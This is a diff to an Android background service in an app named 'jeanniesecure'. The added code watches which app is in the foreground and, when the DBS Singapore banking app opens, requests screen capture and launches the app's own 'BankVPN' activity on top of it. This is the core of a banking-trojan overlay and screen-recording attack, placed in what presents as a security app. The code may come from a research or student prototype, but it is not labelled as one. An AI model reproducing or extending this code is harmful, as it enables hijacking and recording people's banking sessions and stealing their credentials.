@@ -1,23 +1,42 @@
 package com.example.jeanniesecure;
+//https://www.youtube.com/watch?v=B4gFbWnNpac
+
+/*GET FOREGROUND APP
+ https://stackoverflow.com/questions/28066231/how-to-gettopactivity-name-or-get-currently-running-application-package-name-i*/
+
 
 import android.app.ActivityManager;
-import android.content.ComponentName;
+import android.app.usage.UsageStats;
+import android.app.usage.UsageStatsManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
+import android.media.projection.MediaProjectionManager;
+import android.os.Build;
 import android.support.annotation.NonNull;
 import android.support.v4.app.JobIntentService;
 import android.util.Log;
+import android.widget.ToggleButton;
 
 import java.util.List;
+import java.util.SortedMap;
 import java.util.Timer;
 import java.util.TimerTask;
+import java.util.TreeMap;
 
 public class ExampleJobIntentService extends JobIntentService {
     public int counter=0;
     private static final String TAG = "ExampleJobIntentService";
     public Context context;
+    public static boolean redirected = false;
+
+    //Screen Recording
+    private ToggleButton mToggleButton;
+
+
+
+    //END Screen Recording
 
 
     static void enqueueWork(Context context, Intent work){
@@ -27,12 +46,14 @@ public class ExampleJobIntentService extends JobIntentService {
     @Override
     public void onCreate() {
         super.onCreate();
+        this.context = getApplicationContext();
         Log.d(TAG, "onCreate: ");
     }
 
     @Override
     protected void onHandleWork(@NonNull Intent intent){
         Log.d(TAG, "onHandleWork: ");
+        if (isStopped()) return;
         startTimer();
     }
 
@@ -66,6 +87,7 @@ public class ExampleJobIntentService extends JobIntentService {
             Log.d(TAG, "Launch Activity :" + pm.getLaunchIntentForPackage(packageInfo.packageName));
         }
 
+
         //initialize the TimerTask's job
         initializeTimerTask();
 
@@ -76,44 +98,60 @@ public class ExampleJobIntentService extends JobIntentService {
     public void initializeTimerTask() {
         timerTask = new TimerTask() {
             public void run() {
-                if (isForeground(ExampleJobIntentService.this, "com.example.jeanniesecure")) {
-                    Log.d(TAG, "App is running!");
-
-                } else {
-                    Log.d(TAG, "App is not running!");
-                }
+                retriveNewApp();
                 Log.i("in timer", "in timer ++++  "+ (counter++));
-
             }
         };
     }
 
-/*    public static boolean isAppRunning(final Context context, final String packageName) {
-        final ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
-        final List<ActivityManager.RunningAppProcessInfo> procInfos = activityManager.getRunningAppProcesses();
 
-        if (procInfos != null)
-        {
-            for (final ActivityManager.RunningAppProcessInfo processInfo : procInfos) {
-                Log.d(TAG, processInfo.toString());
-                if (processInfo.processName.equals(packageName)) {
-                    return true;
+    private String retriveNewApp() {
+        if (Build.VERSION.SDK_INT >= 21) {
+            String currentApp = null;
+            UsageStatsManager usm = (UsageStatsManager) this.getSystemService(Context.USAGE_STATS_SERVICE);
+            long time = System.currentTimeMillis();
+            List<UsageStats> applist = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 1000, time);
+            if (applist != null && applist.size() > 0) {
+                SortedMap<Long, UsageStats> mySortedMap = new TreeMap<>();
+                for (UsageStats usageStats : applist) {
+                    mySortedMap.put(usageStats.getLastTimeUsed(), usageStats);
+                }
+                if (mySortedMap != null && !mySortedMap.isEmpty()) {
+                    currentApp = mySortedMap.get(mySortedMap.lastKey()).getPackageName();
                 }
             }
+            if(currentApp != null){
+                if (currentApp.equals("com.dbs.sg.dbsmbanking") && !redirected) {
+                    Log.e(TAG, "iBanking app opened by user!");
+                    MediaProjectionManager manager = (MediaProjectionManager)getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+                    Intent permissionIntent = manager.createScreenCaptureIntent();
+                    redirected = true;
+                    Intent AppIntent  = new Intent(getApplicationContext(), BankVPN.class);
+                    AppIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(AppIntent);
+                    onStopCurrentWork();
+                } /*else if (currentApp.equals("com.dbs.sg.dbsmbanking") && redirected) {
+                    //do nothing
+                }*/ else if (!currentApp.equals("com.dbs.sg.dbsmbanking") && !currentApp.equals("com.example.jeanniesecure") && !currentApp.equals("com.android.systemui") && redirected){
+                    redirected = false;
+                    Log.d(TAG, "Stop Recording ");
+                }
+                Log.e(TAG, "Current App in foreground is: " + currentApp);
+                return currentApp;
+                }
+            return currentApp;
+            }
+        else {
+            ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+            String mm=(manager.getRunningTasks(1).get(0)).topActivity.getPackageName();
+            Log.e(TAG, "Current App in foreground is: " + mm);
+            return mm;
         }
-        return false;
-    }*/
-
-    public static boolean isForeground(Context ctx, String myPackage){
-        ActivityManager manager = (ActivityManager) ctx.getSystemService(ACTIVITY_SERVICE);
-        List< ActivityManager.RunningTaskInfo > runningTaskInfo = manager.getRunningTasks(1);
-
-        ComponentName componentInfo = runningTaskInfo.get(0).topActivity;
-        /*Log.d(TAG, componentInfo.getPackageName());*/
-        if(componentInfo.getPackageName().equals(myPackage)) {
-            return true;
-        }
-        return false;
     }
+
+
+
+
+
 
 }
